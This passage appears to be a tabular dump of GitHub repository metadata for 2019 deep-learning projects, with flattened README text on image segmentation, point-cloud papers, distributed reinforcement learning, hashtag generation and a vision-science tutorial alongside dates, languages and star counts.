in a local machine and most of the data cannot be used These examples should be used as a tutorial for the package just to have a basic idea of how to run and create an image segmentation pipeline with segmed but you will not be able to rerun the notebooks The reason for this is that most of the datasets are very large so they cannot be bundled with this repository some other datasets cannot be redistributed as per request of the original authors Either way all of the trained models and weights are freely available upon request Demo For completeness here is a simple example Assuming you have followed the instructions and everything is installed correctly you can do the following to train a simple U Net model python from segmed train import trainunet from segmed models import Unet Define some example hyperparameters batchsize 8 epochs 50 stepsperepoch 100 Declare the paths to use following the Keras convention https www tensorflow org versions r2 0 apidocs python tf keras Model fitgenerator datapath general path to images imgpath datapath augmented images path maskspath datapath augmented masks path modelfile path to save model unetmodel h5 Create a Unet custom model with a regularizer and batch normalization customparams activation relu padding same batchnorm True l2reg 0 995 model Unet variant custom parameters customparams Train the model history trainunet model imgpath maskspath batchsize batchsize epochs epochs stepsperepoch stepsperepoch modelfile modelfile Now the training should have started and you re good to go Datasets The datasets employed in some of the parts of this repository are the following ISBI 2012 Challenge http brainiac2 mit edu isbichallenge home Motion based Segmentation and Recognition Dataset http mi eng cam ac uk research projects VideoRec CamVid DRIVE Digital Retinal Images for Vessel Extraction https www isi uu nl Research Databases DRIVE Fast and Robust Segmentation of White Blood Cell Images by Self supervised Learning https github com zxaoyou segmentationWBC,2019-08-22T16:02:53Z,2019-11-19T08:38:30Z,Jupyter Notebook,DCI-NET,Organization,1,3,2,194,master,edwinb-ai#Abdiel-EMT#gmagannaDevelop,3,0,0,9,8,2,22
seriousran,TMI-Deep-Learning,n/a,TMI Deep Learning,2019-09-15T13:04:56Z,2019-10-23T06:53:52Z,n/a,seriousran,User,1,3,0,1,master,seriousran,1,0,0,0,0,0,0
Practical-AI,AdvancedDeepLearning,n/a,AdvancedDeepLearning This repository is created for the Deep Learning course which has been held at Khaje Nasir Toosi University in 2019 summer You can find the vidoes of the course in the following youtube channel https www youtube com watch v AChPRCwZW4s list PL2g5adpoaeL2bWnE5K ctgjCn1HbmHGv The code and material of this repository belong to advance course I m Pooya Mohammadi and you can contact me from one of the following ways telegram id PooyaMohammadiK LinkedIn https linkedin com in pooya mohammadi email pooya209 ymail com,2019-09-18T20:01:44Z,2019-11-30T14:45:16Z,Jupyter Notebook,Practical-AI,User,3,3,0,17,master,Practical-AI#Pooya-Mohammadi-K,2,0,0,0,0,0,0
arthuralvim,deep-learning-vinheta,n/a,deep learning vinheta Ferramentas ffmpeg python bash pipenv install dev,2019-09-10T11:50:52Z,2019-09-12T13:05:13Z,n/a,arthuralvim,User,2,3,0,2,master,arthuralvim,1,0,0,0,0,0,0
li-xin-yi,wide-deep_learning_share_silde,n/a,wide deeplearningsharesilde,2019-08-20T19:16:28Z,2019-11-09T12:30:36Z,TeX,li-xin-yi,User,1,3,1,3,master,li-xin-yi,1,0,0,0,0,0,0
cornelltech,deep-learning-clinic-2019-Fall,n/a,deep learning clinic 2019,2019-08-18T20:55:35Z,2019-12-03T02:49:29Z,HTML,cornelltech,Organization,9,3,1,0,master,,0,0,0,0,0,0,0
PointCloudYC,Deep-Learning-On-Point-Clouds,deep-learning#papers#point-clouds,Deep Learning On Point Clouds A curated list of key papers on applying deep learning on point cloud data More importantly I will try to summarize on these papers with a note Each note will try to summarize the basic background main proposals key components of the proposals achitecture code implementation methodology part potential use of the paper and etc P S notes will be mostly written using my own words and conform the principles of high readability Papers Charles QI Su HAO Leo Guibas Stanford University PointNet CVPR 2017 oral https github com charlesq34 pointnet my note PointNet md PointNet NIPS 2017 https github com charlesq34 pointnet2 my note PointNet md F PointNet CVPR 2018 https github com charlesq34 frustum pointnets VoteNet ICCV 2019 https github com facebookresearch votenet pointnet autoencoder https github com charlesq34 pointnet autoencoder FlowNet3D CVPR 2019 https github com xingyul flownet3d KpConv ICCV 2019 https github com HuguesTHOMAS KPConv Volumetric and multi view CNNs CVPR 2016 spotlight https github com charlesq34 3dcnn torch Render for cnn ICCV 2015 https github com ShapeNet RenderForCNN 3D adversarial point clouds CVPR 2018 https github com xiangchong1 3d adv pc PartNet CVPR 2019 https github com daerduoCarey partnetdataset GeoNet CVPR2018 https github com yzcjtr GeoNet SPFN CVPR 2019 Oral https github com lingxiaoli94 SPFN Other Relation CNN CVPR 2019 Oral Best paper finalist https github com Yochengliu Relation Shape CNN my note RS CNN md superpoint graph CVPR2018 CVPR2019 https github com loicland superpointgraph PointCNN NIPS2018 https github com yangyanli PointCNN SPLATNet CVPR2018 https github com NVlabs splatnet So Net CVPR 2018 https github com lijx10 SO Net DGCNN ACM Transactions on Graphics 2019 https github com WangYueFt dgcnn OctNet CVPR 2017 https github com griegler octnet 3D Fully Convolutional Network for Vehicle Detection in Point Cloud https github com yukitsuji 3DCNNtensorflow PointRCNN CVPR 2019 https github com sshaoshuai PointRCNN Scan2CAD CVPR 2019 https github com skanti Scan2CAD 3D SIS CVPR 2019 https github com Sekunde 3D SIS SGPN CVPR 2018 https github com laughtervv SGPN GSPN CVPR 2019 https github com ericyi GSPN VoxelNet CVPR 2017 https github com tsinghua rll VoxelNet tensorflow Tangent Convolutions CVPR 2018 https github com tatarchm tangentconv PCN 3DV 2018 Oral https github com wentaoyuan pcn 3DMatch CVPR 2017 Oral https github com andyzeng 3dmatch toolbox 3D point cloud generation AAAI 2018 oral https github com chenhsuanlin 3D point cloud generation newest classic papers 4D Spatio Temporal ConvNets Minkowski Convolutional Neural Networks ScanNet No 1 on the leatherboard 26th sep 19 3D Semantic Segmentation with Submanifold Sparse Convolutional Networks and Submanifold Sparse Convolutional Networks ScanNet No 2 on the leatherboard 26th sep 19 Todos notes for each key paper pointnet pointnet votenet pointcnn add links to each paper,2019-09-15T07:18:12Z,2019-12-05T08:37:51Z,n/a,PointCloudYC,User,1,3,0,32,master,PointCloudYC#YinChaoOnline,2,0,0,0,0,0,0
sunjesse,Deep-Learning-Seminar-and-Workshop,n/a,Deep Learning Seminar and Workshop,2019-09-12T15:29:42Z,2019-10-10T01:39:36Z,Python,sunjesse,User,1,3,0,7,master,sunjesse,1,0,0,0,0,0,0
createamind,Distributed-DRL,n/a,Distributed DRL Distributed Deep Reinforcement Learning This framework inspired by general purpose RL training system Rapid from OpenAI Rapid framework rapid architecture 2x 1 pictures rapid architecture 2x 1 png Our framework ddrlframework pictures ddrlframework jpg This framework divides the reinforcement learning process into five parts Replay buffer option Parameter server train learn rollout test python ray remote class ReplayBuffer replay buffer ray remote class ParameterServer object keep the newest network weights here could pull and push the weights also could save the weights to local ray remote numgpus 1 maxcalls 1 def workertrain ps replaybuffer opt learnerindex build a learner network pull weights from ps for loop get sample batch from replaybuffer update network and push new weights to ps ray remote def workerrollout ps replaybuffer opt workerindex bulid a rollout network pull weights from ps for loop interactive with environment store experience to replay buffer if end of episode pull weights from ps ray remote def workertest ps replaybuffer opt workerindex 0 bulid a test network usually same as rollout while pull weights from ps do test might save model here if name main ray init objectstorememory 1000000000 redismaxmemory 1000000000 opt HyperParameters FLAGS envname FLAGS totalepochs FLAGS numworkers create the parameter server if FLAGS isrestore True ps ParameterServer remote isrestore True else net Learner opt job main allkeys allvalues net getweights ps ParameterServer remote allkeys allvalues create replay buffer replaybuffer ReplayBuffer remote obsdim opt obsdim actdim opt actdim size opt replaysize Start some rollout tasks taskrollout workerrollout remote ps replaybuffer opt i for i in range FLAGS numworkers time sleep 5 start training tasks tasktrain workertrain remote ps replaybuffer opt i for i in range FLAGS numlearners start testing tasktest workertest remote ps replaybuffer opt wait util task test end Keep the main process running Otherwise everything will shut down when main process finished ray wait tasktest Result Env LunarLanderContinuous v2 GPU GTX1060 x1 SAC1 without distribution gets 200 in 1200s sac1 pictures sac1 png Distributed SAC1 gets 200 in 360s dsac1 pictures dsac1 png,2019-08-09T09:15:57Z,2019-12-13T14:47:13Z,Python,createamind,Organization,2,3,0,132,master,LiuShuai26#JingbinLiu,2,0,0,0,0,0,0
pengfei93,Dual-aae,clustering-algorithm#pytorch,This repository provides a PyTorch implementation of the paper Dual Adversarial Autoencoders for Clustering Dependencies Python 3 5 Pytorch 0 2 0 Usage 1 Training To train Dual AAE on MNIST run the training script below python main py 2 Testing To test Dual AAE on MNIST python mnisttest py,2019-08-07T04:21:17Z,2019-09-03T06:35:16Z,Python,pengfei93,User,1,3,1,10,master,pengfei93,1,0,0,0,0,0,0
mjacar,deep-rl-algorithms,n/a,Deep Reinforcement Learning Algorithms This repo serves as a companion to An Overview of Reinforcement Learning http probablyexactlywrong rl It contains Pytorch implementations of the DQN https storage googleapis com deepmind media dqn DQNNaturePaper pdf DDPG https arxiv org pdf 1509 02971 pdf and PPO https arxiv org pdf 1707 06347 pdf for continuous action spaces algorithms The DQN and DDPG algorithms are implemented in a parallel fashion in the style of APE X https openreview net pdf id H1Dy 0Z with multiple CPU actor processes asynchronously communicating with a single CPU replay buffer process and a single GPU learner process apexpng assets apex png Usage To run any algorithm run the command python agent py env Run python agent py help for further information about command line arguments Note on PPO While it is straightforward to extend the implementation of PPO to be parallel as well it was found that using decoupled actor processes did not perform very well due to differences in the running mean and standard deviation of the observations and rewards Solving that by having all actor processes interact with a single process that kept track of the running means and standard deviations worked but caused a communication bottleneck that obviated the advantage of parallelism in the first place OpenAI s baseline implementation https github com openai baselines solves this by using lower level primitives that I chose to avoid for the sake of simplicity,2019-08-14T14:30:02Z,2019-11-20T16:07:08Z,Python,mjacar,User,1,3,0,1,master,mjacar,1,0,0,0,0,0,0
afaq-ahmad,Table-Detection-using-Deep-Learning-FasterRCNN,n/a,Table Detection using Deep Learning on Google Colab Table Detection using Deep Learning in a pdf Table detection part is followed by this paper Table Detection using Deep Learning https tukl seecs nust edu pk members projects conference Table Detection Using Deep Learning pdf kindly site it if you are using it Imagepreprocessing minsize 600 maxsize 1024 Dataaugmentation flip leftright True updown True prob 0 5 Model type fasterrcnn network Total number of classes to predict numclasses 1 Procedure Training Run the code 1TableDetectionTraining ipynb on colab python 3 Upload the data zip in colab directory Save the model checkpoint tar File in google drive for Testing Purpose Testing Run the code 2TableDetectionTesting ipynb in colab python 3 Import the model checkpoint from google Drive use same name of checkpoint Upload the testsample png image for testing from image For testing From Pdf first run the code PdfToimages ipynb in local directory Upload the zip of images on colab and run the next section pDF table detection The end product will be saved as Pdf file check the file for accuracy of given model detector,2019-08-27T09:37:43Z,2019-10-19T13:09:23Z,Jupyter Notebook,afaq-ahmad,User,1,3,1,6,master,afaq-ahmad,1,0,0,0,0,0,0
ShivamGaurUQ,Automated-hashtag-generation-using-Deep-Learning,n/a,Objectives 1 Generate hashtags for Instagram images using soft attention mechanism as described in the paper Show Attend and Tell Neural Image Caption Generation with Visual Attention https arxiv org abs 1502 03044 2 Explore the possibility of using the hashtags to generate narrative caption for the image 3 Compare model performance with that of other state of the art models of image captioning 4 Analysis of the results Methodology Images hashtagprocess png Source Adapted from 3 First generate hashtags for an input image by using soft attention model Attention mechanism focusses on important features of the image The model takes an image I as input and produces a one hot encoded list of hashtags denoted by X where X 1 and X x1 x2 x3 x4 xN such that xi RK 3 K is the size of the vocabulary and N is the number of hashtags generated for the image Images hashtagwithattention png Image features are extracted from lower CNN layers ENCODER The decoder uses a LSTM that is responsible for producing a hashtag one word at each time step t which is conditioned on a context vector zt the previous hidden state ht and the previously generated hashtag Soft attention mechanism is used to generate hashtags Source Adapted from 3 The entire network was trained from end to end InceptionV3 pretrained on Imagenet was used to classify images in the HARRISON dataset and features were extracted from the last convolutional layer To generate hashtags the CNN LSTM model with embedding dimension size of 256 512 GRU LSTM units and Adam optimizer was trained for 40 epochs on a GEForce GTX Titan GPU with each epoch taking about 2 5 hours The model was trained on 80 percent of data around 43K images while the remaining was used for testing Images train1 png Summary of the training details for the soft attention model used for hashtag generation Second leverage the hashtag from previous stage to produce a short story by using a character level language model Images charRnn png Source Adapted from 6 The RNN models the probability distribution of the characters in sequence given a sequence of previous characters 7 The hashtag generated in phase 1 is chosen as seed text and using the character sequences of this seed text new characters are generated in sequence The model is trained to generate narratives by adopting the writing style in the corpus using the hashtag Images story png The character level RNN model is trained on PersonaBank corpus which is a collection of 108 personal narratives from various weblogs The corpus is described in the paper PersonaBank A Corpus of Personal Narratives and Their Story Intention Graphs https arxiv org abs 1708 09082 These stories cover a wide range of topics from romance and wildlife to travel and sports Out of 108 stories 55 are positive stories while the remaining are negative Average length of story in the corpus is 269 words The language model is trained using a standard categorical cross entropy loss The language model was trained for 100 epochs with word embedding dimension size of 1024 2 LSTM layers softmax activation function RMSProp optimizer and a learning rate of 0 01on a GEForce GTX Titan GPU to generate stories with 500 characters in length Model evaluation Performance of soft attention model was compared with that of CNN LSTM based image captioning model and multi label image classifier BLEU N and ROGUE L scores were used to evaluate the model peformance Images bleu png 1 Hashtags generation using soft attention model Show attend and tell Harrison dataset is used which is preprocessed and split into 80 10 10 train validation test ratio by preprocess py file Soft attention model is trained using tensorflowattention py in the Show attend and tell Soft Attention directory The code in the tensorflowattention py is adapted from https github com tensorflow docs blob master site en r2 tutorials text imagecaptioning ipynb The test data results lossepoch perplexityepoch readings obtained from the after training the model are saved in the Show attend and Tell Soft Attention directory The model requires Keras Tensorflow and Python 3 6 to train The requirements can be installed in anaconda environment using environmenttensorflow yaml Images loss png Training Loss vs Epoch curve Images allBleu1 png Soft attention model performance evaluation through the plot of BLEU N score versus the images in the test dataset 2 Hashtags generation using CNN LSTM based model Show and tell Harrison dataset is used which is preprocessed and split into 80 10 10 train validation test ratio by preprocess py file CNN LSTM model defined in model py is used to train the model using train py in the Show and tell directory Run buildvocab py train py to train the model Run sample py to generate test data results The code is adapted from https github com yunjey pytorch tutorial tree master tutorials 03 advanced imagecaptioning Requires PyTorch setup which can be done by creating a pytorch environment using environmentpytorch yaml Images allBleu2 png Show and Tell model performance evaluation through the plot of BLEU N score versus the images in the test dataset 3 Hashtags generation using Multi label image classification train2 py is used to generate hashtags using AlexNet implemented using Keras by running in tensorflow environment The test data results lossepoch train and validation accuracyepoch train and validation readings obtained after training and validation of the model are saved in the Multi label image classification directory Images allBleu3 png AlexNet model performance evaluation through the plot of BLEU N score versus the images in the test dataset 4 Story generation using Character level language model model trained using tensorflow model trained on PersonaBank corpus saved in newpersona txt Preprocessed version of persona data train model by running charlangmodel py in tensorflow environment Results Images Results1 png Examples of hashtags predicted by the soft attention model Images Results2 png Images Results3 png Examples of narrative captions generated from the hashtag Performance on MS COCO dataset Though the main objective of this work is to use the soft attention mechanism to generate hashtags and explore if it is possible to generate meaningful paragraph style captions for the image it would not be a bad idea indeed to know how the model fairs in producing sentence level captions instead as originally the model was developed to generate sentence level captions Hence to evaluate this capability of the soft attention mechanism the model was trained on the popular MSCOCO dataset The data was processed and trained in the same way as mentioned earlier The only difference is that due to huge size of the MSCOCO dataset the dataset size was reduced to 10000 images and the model was only trained for 5 epochs Images Results4 png Performance of soft attention model on MSCOCO dataset Publication The novel idea of story generation from the hashtags for the images was accepted and published in the 2019 IEEE 35th International Conference on Data Engineering Workshops ICDEW https ieeexplore ieee org abstract document 8750908 DOI 10 1109 ICDEW 2019 00060 Title of the paper Generation of a Short Narrative Caption for an Image Using the Suggested Hashtag Flask Implementation Get Web application in Flask to generate hashtags automatically for an image https github com ShivamGaurUQ Get Hashtags git Implemented using Pytorch Dependencies Requires Python 3 6 or higher Install Flask Install pytorch Use requirements txt file to install all libraries and packages Steps to run the application Download encoder and decoder pre trained model and save all the files in the same directory Download pre trained pytorch model from https drive google com drive folders 19t8S9wuBl2XZrnJbMB7oYtFoMBtDj 8g usp sharing Run app py Application will run on local server Conclusion Future Work The work successfully achieves the goal of generating hashtags for an image The soft attention mechanism originally used to generate sentence level captions does a good job in generating good quality hashtags for many test cases However it can also be stated that the model is not even close to being perfect in predicting highly quality hashtags This is evident from the results But the model still does a fine job in predicting hashtags if not the best The BLEU N and ROUGE N metrics are only helpful in determining to what extent the predicted output deviates quantitatively from the ground truths These metrics fail to measure the machine translated text or predicted captions contextually The challenge is to look for metrics that can evaluate image captions both in term of similarity and context Another objective of the work was to explore the possibility of using hashtags to generate good quality captions It cannot be denied that stories lacked a proper grammatical structure which made it hard to determine the hidden context that existed if any It will not be an exaggeration to say that the character level language failed extensively in mimicking human beings and writing narratives similar to those written by an actual person It can be argued that it was not an entire fault of the RNN model The problem lied in the dataset chosen for training the model It is a fact that a small sized corpus like PersonaBank made it hard for the model to learn well and optimise weights in order to minimise the cross entropy loss The reason for choosing the PersonaBank was that the original text in the corpus came from real people and it was assumed that if the character level RNN could learn to write stories the way they were in the PersonaBank corpus they could match with the image context in some way or the other This was the second challenge challenge to find a corpus of real life anecdotes incidents and events that was big enough to make a language model learn and to re write text contained in the corpus As mentioned earlier the work is far enough from meeting the high expectations but lessons learnt while implementing the work are precious and will form the base to incorporate improvements in the future One of the most important lessons learnt is that without image attributes it is not easy to produce narrative captions that can match the context of the image For example one useful approach can use image features extracted from CNN during the process of story generation with word level language model instead of the character level language model Another useful technique would be to use skip thought vectors which uses an encoder to encode sentences and then the decoder predicts the previous and next sentence based on the input sentence Generating sentences in such a way helps in producing highly contextual and meaningful text References 1 S Bai and S An A survey on automatic image caption generation Neurocomputing vol 311 pp 291 304 2018 2 N Newhall THE CAPTION THE MUTUAL RELATION OF WORDS PHOTOGRAPHS Aperture vol 1 pp 17 29 1952 3 G Srivastava and R Srivastava A Survey on Automatic Image Captioning in Springer Singapore 2018 4 A Karpathy Connecting images and natural language Stanford University Dept of Computer Science Stanford 2016 5 T Kim M O Heo S Son K W Park and B T Zhang GLocal Attention Cascading Networks for Multi image Cued Story Generation arXiv org 2019 6 C Lee and D Chau Language as pride love and hate Archiving emotions through multilingual Instagram hashtags Discourse Context Media vol 22 pp 21 29 2018 7 E Denton J Weston M Paluri L Bourdev and R Fergus User Conditional Hashtag Prediction for Images in Proceedings of the 21th ACM SIGKDD International Conference on knowledge discovery and data mining 2015 8 O Vinyals A Toshev S Bengio and D Erhan Show and Tell A Neural Image Caption Generator in IEEE Conference on Computer Vision and Pattern Recognition 2015 9 I Sutskever J Martens and J Hinton Generating Text with Recurrent Neural Networks in Proceedings of the 28 th International Conference Bellevue WA USA 2011 10 M Park H Li and J Kim HARRISON A Benchmark on HAshtag Recommendation for Real world Images in Social Networks ArXiv org 2016 11 M S Lukin K Bowden C Barackman and A M Walker PersonaBank A Corpus of Personal Narratives and Their Story Intention Graphs arXiv org 2017 12 S Marsland Neurons Neural Networks and Linear Discriminants in Machine Learning An Algorithmic Perspective CRC Press LLC 2014 pp 39 70 13 M Alom T Taha C Yakopcic S Westberg P Sidike B Van Esesn A Awwal and V Asari The History Began from AlexNet A Comprehensive Survey on Deep Learning Approaches arXiv org 2018 14 Y Lecun Y Bengio and G Hinton Deep learning Nature vol 521 7553 p 436 2015 15 H Salehinejad S Sankar J Barfett E Colak and S Valaee Recent Advances in Recurrent Neural Networks arXiv org 2018 16 K Xu J Ba R Kiros K Cho A Courville R Salakhutdinov R Zemel and Y Bengio Show Attend and Tell Neural Image Caption Generation with Visual Attention arXiv org 2016 17 K Papineni S Roukos T Ward and W J Zhu BLEU a Method for Automatic Evaluation of Machine Translation in Proceedings of the 40th Annual Meeting of the Association forComputational Linguistics ACL Philadelphia 2002 18 X Chen H Fang L Tsung Yi R Vedantam S Gupta P Dollar and C Zitnick Microsoft COCO Captions Data Collection and Evaluation Server arXiv org 2015 19 D Kingma and J Ba ADAM A METHOD FOR STOCHASTIC OPTIMIZATION arXiv org 2017 20 tf nn sparsesoftmaxcrossentropywithlogits TensorFlow Online Available https www tensorflow org apidocs python tf nn sparsesoftmaxcrossentropywithlogits Accessed 09 June 2019 21 Y Bengio R Ducharme P Vincent and C Jauvin A Neural Probabilistic Language Model Journal of Machine Learning Research vol 3 6 pp 1137 1155 2003 22 X Wang W Chen and W Yuan Fang No Metrics Are Perfect Adversarial Reward Learning for Visual Storytelling arXiv org 2018 23 C C Park B Kim and G Kim Attend to You Personalized Image Captioning with Context Sequence Memory Networks in 2017 IEEE Conference on Computer Vision and Pattern Recognition 2017 24 F Ting Hao N Huang I Ferraro A Mostafazadeh J Misra R Agrawal X Devlin P Girshick D He C Kohli D Batra L Zitnick M Parikh M Vanderwende and M Galley Visual Storytelling arXiv org 2016 25 D Gonzalez Rico and G Fuentes Pineda Contextualize Show and Tell A Neural Visual Storyteller arXiv org 2018,2019-08-11T08:13:03Z,2019-11-29T06:56:50Z,Python,ShivamGaurUQ,User,1,3,0,98,master,ShivamGaurUQ,1,0,0,1,0,1,0
zzdzzdzzdzzd,NLSTM,n/a,NLSTM A new deep learning prediction method called Long Short Term Memory Network based on Neighborhood Gates The paper of this method is available at this link https doi org 10 1016 j enconman 2019 04 006 If the paper or code is helpful to you please refer to our paper or code 1 Z Zhang H Qin Y Liu Y Wang L Yao Q Li J Li S Pei Long Short Term Memory Network based on Neighborhood Gates for processing complex causality in wind speed prediction Energy Conversion and Management 2019 192 37 51 doi 10 1016 j enconman 2019 04 006 The introduction in Chinese can refer to my blog https blog csdn net m037728157 article details 98884114 note 1 Due to the confidentiality of the data the data used in the code is slightly different from the original data in the paper 2 The code is written in Java,2019-08-08T11:48:41Z,2019-09-19T12:11:00Z,Java,zzdzzdzzdzzd,User,1,3,2,7,master,zzdzzdzzdzzd,1,0,0,0,0,0,0
maramir6,DeepSatellite,n/a,DeepSatellite DeepSatellite is a class based on Google Earth Engine API to download manage save and train deep learning models based on the Satellite Imagery available in the Google Earth Catalogue Images are managed in Collections They can be exported to Pandas Dataframe Dictionary and Numpy Arrays It is possible to upload them to the cloud through Firebase and Cloud SQL Images can also be rasterized and saved both locally and in Google Storage system if the keyfile is provided Scikit Learn models such as KNN Random Forest and Support Vector Machine are build to be easily trained and saved Hyperparamaters optimization is supported,2019-08-25T19:46:57Z,2019-12-14T04:19:34Z,Python,maramir6,User,1,3,0,2,master,maramir6,1,0,0,0,0,0,0
yufeiwang63,L2D-learning-to-discretize-solving-1d-scalar-conservation-laws-via-deep-reinforcement-learning-,n/a,Source code for the paper learning to discretize solving 1d scalar conservation laws via deep reinforcement learning https arxiv org abs 1905 11079 We will add a lot more comments and code clean later For a breif reference usage at the moment train commands python mainburgers py flux u2 mode wenocoeffour numprocess xxx agent ddpg should set numprocess initutil py line 175 len trainidxes do not set numprocess to be too large or the replay buffer size would be too large and causes MemError 4 is ok for test trained models and plot the evolving animations python mainburgers py flux u3 test True animation 1 loadpath xxx saveRLwenoanimation xxx Tscheme euler rk4,2019-08-21T02:45:31Z,2019-11-04T05:03:32Z,Python,yufeiwang63,User,1,3,0,2,master,yufeiwang63,1,0,0,0,0,0,0
ByronHsu,FEGAN,computer-vision#deep-learning#fisheye#gan#image-rectification#self-supervised-learning#unsupervised-learning,Self Supervised Deep Learning for Fisheye Image Rectification This is the official pytorch implementation of Self Supervised Deep Learning for Fisheye Image Rectification The code is written by Byron Hsu https github com ByronHsu and Brian Chao https github com Mckinsey666 from Department of Electrical Engineering National Taiwan University This work is currently in the submission to 2020 ICASSP https 2020 ieeeicassp org We welcome any advice for this work Feel free to send issue or PR Installation 1 Clone the project git clone 2 Install the prerequisites pip3 install r requirements txt Training 1 Start training bash traingcgan sh datasetpath name 2 Monitor the training process by tensorboard tensorboard logdir runs Testing bash testgcgan sh datasetpath name whichepoch Reference pytorch CycleGAN and pix2pix https github com junyanz pytorch CycleGAN and pix2pix GCGAN https github com hufu6371 GcGAN,2019-09-17T09:06:56Z,2019-12-07T07:53:07Z,Python,ByronHsu,User,1,3,0,64,master,ByronHsu#hufu6371#Mckinsey666#shenperson,4,0,0,0,0,0,0
SpikeAI,2019-10-10_ML-tutorial,n/a,A tutorial introducing Deep Learning for vision science Chlo Pasturel Laurent Perinet INT In this practical workshop we propose to present the new challenges brought by deep learning and more generally by machine learning The objective is to show in the form of simple practical exercises how these new tools allow 1 to categorize images 2 to learn such a model 3 to generate new images from an existing database Atelier mthodologique Utiliser apprentissage profond en vision Chlo Pasturel Laurent Perinet INT Nous proposons dans un court tutoriel de prsenter les nouveaux enjeux apports par l apprentissage profond et plus gnralement par l apprentissage machine L objectif est de montrer sous forme de simples exercises pratiques comment ces nouveaux outils permettent 1 de gnraliser procdures d analyse de donnes 2 de tester de faon simple des modles de rponses visuelles some notes recent papers Engineering a Less Artificial Intelligence https www nature com articles d41586 019 02212 4 Volume 103 Issue 6 25 September 2019 Pages 967 979 Perspective Fabian H Sinz XaqPitkow JacobReimer MatthiasBethge Andreas S Tolias https doi org 10 1016 j neuron 2019 08 034 Call for papers https www journals elsevier com vision research call for papers what do deep neural networks tell us about biological vision Recent years have seen a huge increase in the application of deep learning techniques and biologically inspired deep neural networks DNNs to a broad range of issues in biological vision Indeed DNNs have been described by some as a new framework for vision research allowing an opportunity to reverse engineer the biological system These claims are in part based on work showing human level performance by DNNs in tasks such as image classification and are supported by advances in the development of methods for comparing representational structures computed by DNNs with biological vision systems But the suitability of such networks as a theoretical framework for understanding biological vision is unclear There remain many important questions How should theoretically relevant and irrelevant properties of DNN architectures and processing parameters be distinguished How can network performance be rigorously compared with corresponding biological data What is the range of relevant performance data for evaluating network outputs And to what extent can network activity be used to formulate empirically testable models of biological vision This special issue invites novel contributions on these and related topics We welcome original articles that consider the application of DNNs to understanding any aspect of biological vision We particularly welcome contributions that provide a critical evaluation of DNNs as models of human vision Headline review Opportunities and obstacles for deep learning in biology and medicine https royalsocietypublishing org doi 10 1098 rsif 2017 0387 background Artificial neural networks were originally conceived as a model for computation in the brain 7 Although deep neural networks have evolved to become a workhorse across many fields there is still a strong connection between deep networks and the study of the brain The rich parallel history of artificial neural networks in computer science and neuroscience is reviewed in 346348 CNNs were originally conceived as faithful models of visual information processing in the primate visual system and are still considered so 349 The activations of hidden units in consecutive layers of deep convolutional networks have been found to parallel the activity of neurons in consecutive brain regions involved in processing visual scenes Such models of neural computation are called encoding models as they predict how the nervous system might encode sensory information in the world Even when they are not directly modelling biological neurons deep networks have been a useful computational tool in neuroscience They have been developed as statistical time series models of neural activity in the brain And in contrast to the encoding models described earlier these models are used for decoding neural activity for instance in brainmachine interfaces 350 They have been crucial to the field of connectomics which is concerned with mapping the connectivity of biological neural networks in the brain In connectomics deep networks are used to segment the shapes of individual neurons and to infer their connectivity from 3D electron microscopic images 351 and they have also been used to infer causal connectivity from optical measurement and perturbation of neural activity 352 It is an exciting time for neuroscience Recent rapid progress in deep networks continues to inspire new machine learning based models of brain computation 346 And neuroscience continues to inspire new models of artificial intelligence 348 Machine learning methods enable researchers to discover statistical patterns in large datasets to solve a wide variety of tasks including in neuroscience Recent advances have led to an explosion in the scope and complexity of problems to which machine learning can be applied with an accuracy rivaling or surpassing that of humans in some domains This virtual conference will illuminate the many ways machine learning and neuroscience intersect in the context of data analysis and modeling brain function and how neuroscience can benefit from the machine learning revolution Topics include Basic machine learning concepts and resources Machine learning methods to automate analyses of large neuroscience datasets Using deep network learning to gain insight into how the brain learns Combining machine learning concepts with neuroscience theory to predict nervous system function and uncover general principles The conference will end with speakers sharing their views on promising future directions for both machine learning and neuroscience intro by bengio https interstices info la revolution de lapprentissage profond Jrgen Schmidhuber Deep Learning in Neural Networks An Overview Neural Networks volume 61 pp 85 117 January 2015 The term machine learning was coined by Arthur Samuel in 1959 to describe the subfield of computer science that involves the programming of a digital computer to behave in a way which if done by human beings or animals would be described as involving the process of learning Samuel 1959 However the current models are designed with engineering goals and not to model brain computations it s a set back from the computational neuroscience approach highly successful but adversarial examples The deep mystery of vision How to integrate generative and discriminative models Whittington19 articleWhittington19 title Theories of Error Back Propagation in the Brain volume 23 issn 13646613 doi 10 1016 j tics 2018 12 005 language en number 3 journal Trends in Cognitive Sciences author Whittington James C R and Bogacz Rafal month mar year 2019 pages 235 250 file Users laurentperrinet Zotero storage EQCWD575 Whittington and Bogacz 2019 Theories of Error Back Propagation in the Brain pdf note 00001 https neuronline sfn org Articles Scientific Research 2019 Machine Learning in Neuroscience Fundamentals and Possibilities utmcampaign Machine 20Learning 20Virtual 20Conference related events on CVnet As part of the Summer School on Imaging with Medical Applications SSIMA 2019 16 20 September 2019 in Bucharest Romania a full day masterclass will be given on 16 September 2019 by prof Bart ter Haar Romeny Eindhoven University of Technology the Netherlands See for all details and registration https ssima eu masterclass deep learning The Masterclass on Deep Learning will not only discuss the layers of the convolutional networks and the application of modern Deep Learning tools but will go further We will discuss the intrinsic mechanisms of the black box the essential notion of representation learning and the neuro mathematics of self organization and contextual processing We will take a deep tour into modern vision and brain research both in the retina as visual cortex and realize the strong similarities between the visual pathway and Deep Learning and how much can be learned from one by studying the other We demonstrate surgical software tools to dissect the network layers and look inside what they compute and explain modern visualization tools like t SNE All essential mathematics is explained in an intuitive way with many visual and hands on examples The masterclass can be followed by all interested in deep learning with an emphasis on trying to understand what happens inside All code of all examples is given to the participants The Summer School is MICCAI endorsed supported by EuSoMII and has world class speakers on Deep Learning in Medical Imaging Big Data in Healthcare Medical Sensors Robots and AI based Data Analysis Website https ssima eu Organizers Kristin Branson is a group leader and the head of computation and theory at the Howard Hughes Medical Institute s Janelia Research Campus Her lab develops new machine vision and learning technologies to extract scientific understanding from large image data sets Using these systems Janelia Research Campus aims to gain insight into behavior and how it is generated by the nervous system She earned her BA in computer science from Harvard University and her PhD in computer science from the University of California San Diego and completed postdoctoral training at the California Institute of Technology Edda Floh Thiels is an adjunct associate professor of neurobiology at the University of Pittsburgh School of Medicine and a program director in the Directorate for Biological Sciences at the National Science Foundation Thiels main research interests lie in how animals acquire information from the environment and use that information to guide their behavior She received her undergraduate degree in psychology from the University of Toronto and her PhD in psychology from Indiana University Runion du GdR ISIS Titre Thorie du deep learning Dates 2019 10 17 Lieu Cnam Paris amphith tre Paul Painlev 292 rue Saint Martin 75003 Paris Annonce Les rseaux de neurones profonds ont marqu l entre dans une nouvelle re de l intelligence artificielle ponctue par des succs oprationnels dans des domaines varis de la 